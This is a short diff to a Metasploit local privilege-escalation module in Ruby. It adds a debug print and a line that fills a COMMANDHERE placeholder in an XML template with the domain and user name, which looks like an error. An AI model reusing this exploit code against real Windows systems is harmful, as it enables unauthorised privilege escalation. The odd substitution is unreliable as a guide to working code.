@@ -181,6 +181,7 @@ class Metasploit3 < Msf::Exploit::Local
 		xml = xml_file.read
 		xml_file.close
 
+		puts path
 		begin
 			vt = client.railgun.kernel32.GetLocalTime(32)
 			ut = vt['lpSystemTime'].unpack("v*")
@@ -200,6 +201,8 @@ class Metasploit3 < Msf::Exploit::Local
 		# put in user information
 		xml = xml.sub(/DOMAINHERE/, user)
 		xml = xml.sub(/USERHERE/, "#{domain}\\#{user}")
+
+		xml = xml.sub(/COMMANDHERE/, "#{domain}\\#{user}")
 		return xml
 	end
 
